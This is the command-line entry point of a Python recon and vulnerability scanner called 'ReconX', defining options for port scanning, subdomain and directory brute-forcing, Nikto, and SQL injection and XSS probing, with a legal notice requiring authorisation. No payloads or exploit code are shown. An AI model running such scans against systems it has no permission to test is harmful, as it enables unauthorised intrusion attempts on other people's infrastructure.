    parser = argparse.ArgumentParser(
        prog="reconx",
        description="ReconX — All-in-One Bug Bounty & Recon Scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  Full scan:          python reconx.py -t example.com
  With params:        python reconx.py -t "http://example.com?id=1"
  Custom ports:       python reconx.py -t example.com --only-ports --ports 22,80,443
  Skip slow modules:  python reconx.py -t example.com --skip-sub --skip-links
  Save report:        python reconx.py -t example.com -o results.json
Legal: Only test systems you own or have written authorization to test.
      Unauthorised use is illegal.
        """
    )
    parser.add_argument("-t","--target", required=True, help="Domain or URL (e.g., example.com or http://example.com)")
    parser.add_argument("-o","--output", default="", help="Save JSON report to file (auto-named if omitted)")
    parser.add_argument("--threads", type=int, default=30, help="Concurrent threads (default: 30)")
    parser.add_argument("--timeout", type=int, default=5, help="Request timeout in seconds (default: 5)")
    parser.add_argument("--delay", type=float, default=0.0, help="Random delay between requests (0‑N seconds)")
    parser.add_argument("--ports", default="", help="Comma-separated ports to scan")
    parser.add_argument("--verify-ssl", action="store_true", help="Enable SSL verification")
    parser.add_argument("--proxy", type=str, help="Proxy URL (http://127.0.0.1:8080)")
    parser.add_argument("--cookies", type=str, help="Cookies (semicolon‑separated)")
    parser.add_argument("--user-agent", type=str, help="Custom User‑Agent")
    parser.add_argument("--verbose", action="store_true", help="Show detailed error messages")
    parser.add_argument("--progress", action="store_true", help="Show progress bars (needs tqdm)")
    parser.add_argument("--scope", type=str, help="Comma‑separated list of in‑scope domains/IPs")
    parser.add_argument("--robots", action="store_true", help="Respect robots.txt disallowed paths")
    parser.add_argument("--dir-status", type=str, help="Filter HTTP status codes for dir brute (comma‑separated)")
    parser.add_argument("--sub-wordlist", type=str, help="Additional subdomain wordlist file")
    parser.add_argument("--dir-wordlist", type=str, help="Additional directory wordlist file")
    parser.add_argument("--sqli-blind", action="store_true", help="Enable time‑based SQLi detection")

    # Skip flags
    skip_group = parser.add_argument_group("skip modules")
    skip_group.add_argument("--skip-whois", action="store_true"); skip_group.add_argument("--skip-dns", action="store_true")
    skip_group.add_argument("--skip-sub", action="store_true"); skip_group.add_argument("--skip-ports", action="store_true")
    skip_group.add_argument("--skip-tech", action="store_true"); skip_group.add_argument("--skip-dirs", action="store_true")
    skip_group.add_argument("--skip-links", action="store_true"); skip_group.add_argument("--skip-nikto", action="store_true")
    skip_group.add_argument("--skip-db", action="store_true"); skip_group.add_argument("--skip-sqli", action="store_true")
    skip_group.add_argument("--skip-xss", action="store_true")

    # Only flags
    only_group = parser.add_argument_group("only (run specific module, skip all others)")
    only_group.add_argument("--only-whois", action="store_true"); only_group.add_argument("--only-ports", action="store_true")
    only_group.add_argument("--only-sub", action="store_true"); only_group.add_argument("--only-dirs", action="store_true")
    only_group.add_argument("--only-sqli", action="store_true"); only_group.add_argument("--only-xss", action="store_true")
    only_group.add_argument("--only-nikto", action="store_true")

    args = parser.parse_args()

    # Process scope / dir-status
    if args.scope:
        args.scope = [s.strip() for s in args.scope.split(",") if s.strip()]
    else:
        args.scope = None
    if args.dir_status:
        try:
            args.dir_status = {int(x) for x in args.dir_status.split(",")}
        except ValueError:
            print(f"{R}[!] Invalid --dir-status format. Use e.g. 200,301{RST}"); sys.exit(1)
    else:
        args.dir_status = None

    # Handle --only flags
    only_active = any([args.only_whois, args.only_ports, args.only_sub, args.only_dirs,
                       args.only_sqli, args.only_xss, args.only_nikto])
    if only_active:
        args.skip_whois = not args.only_whois; args.skip_dns = True
        args.skip_sub = not args.only_sub; args.skip_ports = not args.only_ports
        args.skip_tech = True; args.skip_dirs = not args.only_dirs
        args.skip_links = True; args.skip_nikto = not args.only_nikto
        args.skip_db = True; args.skip_sqli = not args.only_sqli
        args.skip_xss = not args.only_xss

    start = time.time()
    results = run_scan(args)
    elapsed = round(time.time() - start, 1)
    print_summary(results)
    good(f"Completed in {elapsed}s")
    out = args.output or f"reconx_{results['domain']}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    save_report(results, out)

if __name__ == "__main__":
    main()

